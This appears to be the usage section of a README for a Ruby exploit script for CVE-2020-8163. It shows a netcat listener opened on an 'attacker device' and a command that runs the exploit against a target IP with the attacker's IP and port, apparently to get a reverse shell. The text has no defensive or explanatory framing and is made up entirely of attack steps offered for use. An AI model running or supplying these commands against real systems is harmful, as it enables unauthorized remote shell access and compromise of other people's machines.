# Usage
[ Attacker Device ]
$ nc -l 8888

[ Exploit ]
$ ruby CVE-2020-8163.rb ${target ip} ${attacker ip} ${attacker port}
